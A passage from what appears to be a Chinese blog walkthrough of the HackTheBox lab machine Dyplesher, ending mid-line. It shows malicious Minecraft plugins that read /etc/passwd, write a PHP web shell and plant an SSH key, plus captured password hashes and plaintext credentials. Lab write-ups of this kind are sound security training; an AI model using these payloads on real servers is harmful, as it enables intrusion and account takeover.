class="name">repositories</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.spigotmc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spigot-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.16.2-R0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>右下角弹出提示需要导入这些依赖包，点击<code>Import Changes</code>，IDEA会开始进行下载：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/23.png" alt="23"></p>
<h4 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h4><p>然后在左侧的文件夹<code>mineplug -&gt; src -&gt; main -&gt; java</code>，右键新建一个包<code>java -&gt; New -&gt; Package</code>，包名是你的GroupId + plugin名，我这里就是<code>htb.dyplesher.mineplug</code>。然后在该package下新建一个Class，<code>New -&gt; Class</code> 。在编写插件时需要先引入必要的包，<code>import org.bukkit.plugin.java.JavaPlugin</code>，先利用两个方法<code>onEnable()</code>和<code>onDisable()</code>进行测试：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> htb.dyplesher.mineplug;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.bukkit.plugin.java.JavaPlugin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">mineplug</span> <span class="keyword">extends</span> <span class="title">JavaPlugin</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onEnable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        getLogger().info(<span class="string">"onEnable is called!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDisable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        getLogger().info(<span class="string">"onDisable is called!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h4><p>然后需要将其打包成jar包，首先右键<code>src -&gt; main -&gt; resources</code>，新建<code>plugin.yml</code>文件，填入plugin的相关信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name: mineplug</span><br><span class="line">version: 1.0</span><br><span class="line">main: htb.dyplesher.mineplug.mineplug</span><br></pre></td></tr></table></figure>

<p>项目的目录结构：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/24.png" alt="24"></p>
<p>在IDEA的最右侧隐藏栏上，选择<code>Maven Projects -&gt; mineplug -&gt; Lifecycle</code>，右键<code>package -&gt; Run Maven Build</code>，生成的jar包在target文件夹下。</p>
<h3 id="上传插件"><a href="#上传插件" class="headerlink" title="上传插件"></a>上传插件</h3><p>然后将其通过<code>/home/add</code>上传到服务器上：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/25.png" alt="25"></p>
<p>通过<code>/home/reload</code>，输入插件名mineplug来激活：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/26.png" alt="26"></p>
<p>在Console处可以看到被激活的插件：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/27.png" alt="27"></p>
<p>选择unload可以卸载相应的插件：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/28.png" alt="28"></p>
<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>既然上传的jar包可以被运行，就意味着可以利用它来执行一些系统命令或是读取一些敏感文件：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> htb.dyplesher.mineplug;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.bukkit.plugin.java.JavaPlugin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">mineplug</span> <span class="keyword">extends</span> <span class="title">JavaPlugin</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onEnable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        getLogger().info(<span class="string">"onEnable is called!"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String Line;</span><br><span class="line">            BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(<span class="string">"/etc/passwd"</span>));</span><br><span class="line">            <span class="keyword">while</span> ((Line = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                getLogger().info(Line);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDisable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        getLogger().info(<span class="string">"onDisable is called!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在Console里就打印出了服务器上/etc/passwd文件的内容：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/29.png" alt="29"></p>
<h3 id="上传shell"><a href="#上传shell" class="headerlink" title="上传shell"></a>上传shell</h3><p>写入shell：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> htb.dyplesher.shellplug;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.bukkit.plugin.java.JavaPlugin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">shellplug</span> <span class="keyword">extends</span> <span class="title">JavaPlugin</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onEnable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        getLogger().info(<span class="string">"onEnable is called!"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileWriter fw = <span class="keyword">new</span> FileWriter(<span class="string">"/var/www/test/cmd.php"</span>);</span><br><span class="line">            fw.write(<span class="string">"&lt;?php echo shell_exec($_GET[0]); ?&gt;"</span>);</span><br><span class="line">            fw.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            getLogger().info(e.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDisable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        getLogger().info(<span class="string">"onDisable is called!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问 <a href="http://test.dyplesher.htb/cmd.php?0=id" target="_blank" rel="noopener">http://test.dyplesher.htb/cmd.php?0=id</a> :</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/30.png" alt="30"></p>
<p>当前的用户为MinatoTW，看看<code>/home/MinatoTW</code>下有什么，cmd.php?0=ls%20-al%20/home/MinatoTW ：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/31.png" alt="31"></p>
<p>发现<code>.ssh</code>目录，在目录下有<code>authorized_keys</code>，那只要上传我们自己的公钥就可以免密登录了：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/32.png" alt="32"></p>
<p>我本机的<code>.ssh</code>目录下没有ssh密钥，所以先执行ssh-keygen创建密钥对：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/34.png" alt="34"></p>
<p>创建后目录下会多出两个文件<code>id_rsa</code>和<code>id_rsa.pub</code>，前者是私钥，后者是公钥：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/35.png" alt="35"></p>
<p>我们需要将公钥写入到目标主机的<code>authorized_keys</code>文件中，就能实现免密登录：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> htb.dyplesher.sshplugin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.bukkit.Bukkit;</span><br><span class="line"><span class="keyword">import</span> org.bukkit.plugin.java.JavaPlugin;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">sshplugin</span> <span class="keyword">extends</span> <span class="title">JavaPlugin</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onEnable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        getLogger().info(<span class="string">"onEnable is called!"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileWriter fw = <span class="keyword">new</span> FileWriter(<span class="string">"/home/MinatoTW/.ssh/authorized_keys"</span>);</span><br><span class="line">            fw.write(<span class="string">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCu/ObL6IdSkC6UU2xkZR3frEofJxER7tnjG59fa2Zk98m1Ib/[......]/e01IYwqeAFXhW4wvezG/Icbf2iuTOHggEdnHsBDBL/upYw== kali@kali"</span>);</span><br><span class="line">            fw.close();</span><br><span class="line">            getLogger().info(<span class="string">"Successfully wrote to the file"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            getLogger().info(e.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDisable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        getLogger().info(<span class="string">"onDisable is called!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上传插件并加载后，登录成功：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/33.png" alt="33"></p>
<p>登录后，在<code>/home/MinatoT</code>目录下有三个文件夹：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">MinatoTW@dyplesher:~$ ls</span><br><span class="line">backup  Cuberite  paper</span><br><span class="line">MinatoTW@dyplesher:~$ ls -alt</span><br><span class="line">total 64</span><br><span class="line">drwx------  2 MinatoTW MinatoTW 4096 May 20 13:45 .ssh</span><br><span class="line">drwxr-xr-x 10 MinatoTW MinatoTW 4096 May 20 13:41 .</span><br><span class="line">drwx------  2 MinatoTW MinatoTW 4096 Apr 23  2020 .cache</span><br><span class="line">drwx------  3 MinatoTW MinatoTW 4096 Apr 23  2020 .gnupg</span><br><span class="line">-rw-------  1 MinatoTW MinatoTW  802 Apr 23  2020 .viminfo</span><br><span class="line">drwxrwxr-x 11 MinatoTW MinatoTW 4096 Apr 23  2020 Cuberite</span><br><span class="line">lrwxrwxrwx  1 root     root        9 Apr 23  2020 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">drwxr-xr-x  6 root     root     4096 Apr 23  2020 ..</span><br><span class="line">drwxr-xr-x  2 root     root     4096 Apr 23  2020 backup</span><br><span class="line">drwxrwxr-x  3 MinatoTW MinatoTW 4096 Apr 23  2020 .composer</span><br><span class="line">drwxrwxr-x  6 MinatoTW MinatoTW 4096 Apr 23  2020 paper</span><br><span class="line">-rw-rw-r--  1 MinatoTW MinatoTW   54 Apr 23  2020 .gitconfig</span><br><span class="line">drwxrwxr-x  3 MinatoTW MinatoTW 4096 Apr 23  2020 .local</span><br><span class="line">-rw-rw-r--  1 MinatoTW MinatoTW   66 Apr 23  2020 .selected_editor</span><br><span class="line">-rw-r--r--  1 MinatoTW MinatoTW  220 Apr 23  2020 .bash_logout</span><br><span class="line">-rw-r--r--  1 MinatoTW MinatoTW 3771 Apr 23  2020 .bashrc</span><br><span class="line">-rw-r--r--  1 MinatoTW MinatoTW  807 Apr 23  2020 .profile</span><br></pre></td></tr></table></figure>

<p>backup文件夹下主要就是保存了三个用户的账号密码信息等：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">MinatoTW@dyplesher:~$ cd backup&#x2F;</span><br><span class="line">MinatoTW@dyplesher:~&#x2F;backup$ ls -alt</span><br><span class="line">total 24</span><br><span class="line">drwxr-xr-x 10 MinatoTW MinatoTW 4096 May 20 13:41 ..</span><br><span class="line">drwxr-xr-x  2 root     root     4096 Apr 23  2020 .</span><br><span class="line">-rwxr-xr-x  1 root     root       66 Apr 23  2020 email</span><br><span class="line">-rwxr-xr-x  1 root     root       24 Apr 23  2020 username</span><br><span class="line">-rwxr-xr-x  1 root     root      170 Apr 23  2020 backup.sh</span><br><span class="line">-rwxr-xr-x  1 root     root      182 Sep 15  2019 password</span><br><span class="line">MinatoTW@dyplesher:~&#x2F;backup$ cat email </span><br><span class="line">MinatoTW@dyplesher.htb</span><br><span class="line">felamos@dyplesher.htb</span><br><span class="line">yuntao@dyplesher.htb</span><br><span class="line">MinatoTW@dyplesher:~&#x2F;backup$ cat username </span><br><span class="line">MinatoTW</span><br><span class="line">felamos</span><br><span class="line">yuntao</span><br><span class="line">MinatoTW@dyplesher:~&#x2F;backup$ cat password </span><br><span class="line">$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa</span><br><span class="line">$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK</span><br><span class="line">$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS</span><br><span class="line">MinatoTW@dyplesher:~&#x2F;backup$ cat backup.sh </span><br><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">memcflush --servers 127.0.0.1 --username felamos --password zxcvbnm</span><br><span class="line">memccp --servers 127.0.0.1 --username felamos --password zxcvbnm &#x2F;home&#x2F;MinatoTW&#x2F;backup&#x2F;*</span><br></pre></td></tr></table></figure>

<p><code>paper/</code>文件夹下的内容就是之前在repo.zip包中的部分文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">MinatoTW@dyplesher:~&#x2F;paper$ ls -al</span><br><span class="line">total 39392</span><br><span class="line">drwxrwxr-x  6 MinatoTW MinatoTW     4096 Apr 23  2020 .</span><br><span class="line">drwxr-xr-x 10 MinatoTW MinatoTW     4096 May 20 13:41 ..</span><br><span class="line">-rw-rw-r--  1 MinatoTW MinatoTW        2 Nov  7 14:25 banned-ips.json</span><br><span class="line">-rw-rw-r--  1 MinatoTW MinatoTW        2 Nov  7 14:25 banned-players.json</span><br><span class="line">-rw-rw-r--  1 MinatoTW MinatoTW     1049 Nov  7 14:25 bukkit.yml</span><br><span class="line">drwxrwxr-x  2 MinatoTW MinatoTW     4096 Sep  8  2019 cache</span><br><span class="line">-rw-rw-r--  1 MinatoTW MinatoTW      593 Nov  7 14:25 commands.yml</span><br><span class="line">-rw-rw-r--  1 MinatoTW MinatoTW      221 Sep  8  2019 eula.txt</span><br><span class="line">-rw-rw-r--  1 MinatoTW MinatoTW     2576 Sep  8  2019 help.yml</span><br><span class="line">drwxrwxr-x  2 MinatoTW MinatoTW     4096 Nov  7 14:25 logs</span><br><span class="line">-rw-rw-r--  1 MinatoTW MinatoTW        2 Nov  7 14:25 ops.json</span><br><span class="line">-rw-rw-r--  1 MinatoTW MinatoTW 40248740 Sep  8  2019 paper.jar</span><br><span class="line">-rw-rw-r--  1 MinatoTW MinatoTW     5417 Nov  7 14:25 paper.yml</span><br><span class="line">-rw-rw-r--  1 MinatoTW MinatoTW        0 Sep  8  2019 permissions.yml</span><br><span class="line">drwxrwxr-x  4 MinatoTW MinatoTW     4096 Nov  7 16:20 plugins</span><br><span class="line">-rw-rw-r--  1 MinatoTW MinatoTW      723 Nov  7 14:25 server.properties</span><br><span class="line">-rw-rw-r--  1 MinatoTW MinatoTW     3311 Nov  7 14:25 spigot.yml</span><br><span class="line">-rwxrwxr-x  1 MinatoTW MinatoTW       48 Sep  8  2019 start.sh</span><br><span class="line">-rw-rw-r--  1 MinatoTW MinatoTW        2 Nov  7 14:25 usercache.json</span><br><span class="line">-rw-rw-r--  1 MinatoTW MinatoTW       48 Sep  8  2019 version_history.json</span><br><span class="line">-rw-rw-r--  1 MinatoTW MinatoTW        2 Sep  8  2019 whitelist.json</span><br><span class="line">drwxrwxr-x  5 MinatoTW MinatoTW     4096 Nov  7 17:11 world</span><br></pre></td></tr></table></figure>

<p>Cuberite是Minecraft的一个服务器实现，而<code>Cuberite/</code>目录下就是相关文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MinatoTW@dyplesher:~&#x2F;Cuberite$ ls</span><br><span class="line">BACKERS         buildinfo     Cuberite     helgrind.log  itemblacklist  LICENSE   MojangAPI.sqlite          motd.txt  Ranks.sqlite  start.sh  webadmin          world</span><br><span class="line">banlist.sqlite  CONTRIBUTORS  favicon.png  hg            items.ini      Licenses  MojangAPI.sqlite-journal  Plugins   README.txt    vg        webadmin.ini      world_nether</span><br><span class="line">brewing.txt     crafting.txt  furnace.txt  hg.supp       lang           logs      monsters.ini              Prefabs   settings.ini  vg.supp   whitelist.sqlite  world_the_end</span><br></pre></td></tr></table></figure>

<p>到目前为止并没有在这三个文件夹下发现什么可用的信息……</p>
<p>但是当前的用户的属组之一是<code>wireshark</code>：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MinatoTW@dyplesher:~$ id</span><br><span class="line">uid=1001(MinatoTW) gid=1001(MinatoTW) groups=1001(MinatoTW),122(wireshark)</span><br></pre></td></tr></table></figure>

<p>寻找属组为wireshark的文件，发现只有一个文件<code>/usr/bin/dumpcap</code>，是一个抓包软件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MinatoTW@dyplesher:/$ find / -group wireshark -ls 2&gt;/dev/null </span><br><span class="line">  5908757    112 -rwxr-xr--   1 root     wireshark   113112 Sep 26  2019 /usr/bin/dumpcap</span><br></pre></td></tr></table></figure>

<p>该文件也没有什么suid标志，所以也很难通过它来提权。</p>
<h3 id="dumpcap"><a href="#dumpcap" class="headerlink" title="dumpcap"></a>dumpcap</h3><p>但是我们可以执行dumpcap命令，抓个包试试，保存为<code>/tmp/out.pcapng</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MinatoTW@dyplesher:~$ dumpcap -w &#x2F;tmp&#x2F;out.pcapng</span><br><span class="line">Capturing on &#39;veth5f13bbe&#39;</span><br><span class="line">File: &#x2F;tmp&#x2F;out.pcapng</span><br><span class="line">Packets: 1800</span><br></pre></td></tr></table></figure>

<p>  用wireshark打开<code>out.pcagpng</code>：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/36.png" alt="36"></p>
<p>发现了很多条与AMQP协议相关的流量，右键<code>Follow TCP Stream</code>：</p>
<p><img src="/2021/05/14/HackTheBox-Dyplesher%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/imgs/37.png" alt="37"></p>
<p>发现了用户<code>MinatoTW</code>、<code>felamos</code>和<code>Yuntao</code>的账号密码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">name : MinatoTW</span><br><span class="line">email : MinatoTW@dyplesher.htb</span><br><span class="line">password : bihys1amFov</span><br><span class="line"></span><br><span class="line">name : yuntao</span><br><span class="line">email : yuntao@dyplesher.htb</span><br><span class="line">password : wagthAw4ob</span><br><span class="line"></span><br><span class="line">name : felamos</span><br><span class="line">email : felamos@dyplesher.htb</span><br><span class="line">password : tieb0graQueg</span><br></pre></td></tr></table></figure>

<p>登录用户felamos（在yuntao的/home目录下没有发现什么有意思的东西）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">╭─kali@kali ~ </span><br><span class="line">╰─# ssh felamos@10.10.10.190</span><br><span class="line">felamos@10.10.10.190&#39;s password: </span><br><span class="line">Welcome to Ubuntu 19.10 (GNU&#x2F;Linux 5.3.0-46-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https:&#x2F;&#x2F;help.ubuntu.com</span><br><span class="line"> * Management:     https:&#x2F;&#x2F;landscape.canonical.com</span><br><span class="line"> * Support:        https:&#x2F;&#x2F;ubuntu.com&#x2F;advantage</span><br><span class="line"></span><br><span class="line">  System information as of Sat 07 Nov 2020 05:37:23 PM UTC</span><br><span class="line"></span><br><span class="line">  System load:  0.05              Processes:              259</span><br><span class="line">  Usage of &#x2F;:   6.7% of 97.93GB   Users logged in:        1</span><br><span class="line">  Memory usage: 41%               IP address for ens33:   10.10.10.190</span><br><span class="line">  Swap usage:   0%                IP address for docker0: 172.17.0.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">57 updates can be installed immediately.</span><br><span class="line">0 of these updates are security updates.</span><br><span class="line">To see these additional updates run: apt list --upgradable</span><br><span class="line"></span><br><span class="line">Failed to connect to https:&#x2F;&#x2F;changelogs.ubuntu.com&#x2F;meta-release. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Thu Apr 23 17:33:41 2020 from 192.168.0.103</span><br><span class="line">felamos@dyplesher:~$ id</span><br><span 